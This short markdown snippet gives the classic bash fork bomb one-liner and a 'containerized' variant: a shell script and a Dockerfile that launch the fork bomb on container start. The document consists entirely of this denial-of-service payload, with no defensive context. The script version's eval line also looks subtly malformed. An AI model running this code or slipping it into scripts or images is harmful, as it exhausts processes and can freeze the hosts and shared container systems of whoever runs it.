# 1 Fork Bomb

```shell
:(){ :|:& };:
```
# 2 Containerized Fork Bomb

forkbomb.sh
```shell
#!/bin/bash
echo "start fork bomb"
eval $(:( ){ :|:& };:)
echo "end forkbomb"
```

```dockerfile
FROM debian
COPY forkbomb.sh /forkbomb.sh
RUN chmod +x /forkbomb.sh
ENTRYPOINT ["/forkbomb.sh"]
```

